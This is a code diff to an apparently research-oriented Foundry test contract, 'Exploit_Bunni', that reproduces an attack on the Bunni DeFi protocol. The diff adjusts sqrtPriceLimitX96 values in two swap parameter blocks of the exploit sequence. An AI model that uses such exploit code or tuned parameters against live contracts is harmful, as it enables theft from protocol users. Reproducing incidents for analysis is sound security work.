@@ -146,7 +146,7 @@ contract Exploit_Bunni is IUniswapV3FlashCallback, Test, TokenBalanceTracker {
         swapParams[1] = IPoolManager.SwapParams({
             zeroForOne: false,
             amountSpecified: 1_835_309_634512,
-            sqrtPriceLimitX96: 1461446703485210103287273052203988822378723970341
+            sqrtPriceLimitX96: 79244008939029797398564130531
         });
 
         expectedDeltas[1] = new int256[](2);
@@ -319,7 +319,7 @@ contract Exploit_Bunni is IUniswapV3FlashCallback, Test, TokenBalanceTracker {
         swapParams[0] = IPoolManager.SwapParams({
             zeroForOne: false,
             amountSpecified: -10_000_000_000_000_000000,
-            sqrtPriceLimitX96: 1461446703485210103287273052203988822378723970341
+            sqrtPriceLimitX96: 132047072987237266478933153881482415680958757549
         });
 
         expectedDeltas[0] = new int256[](2);
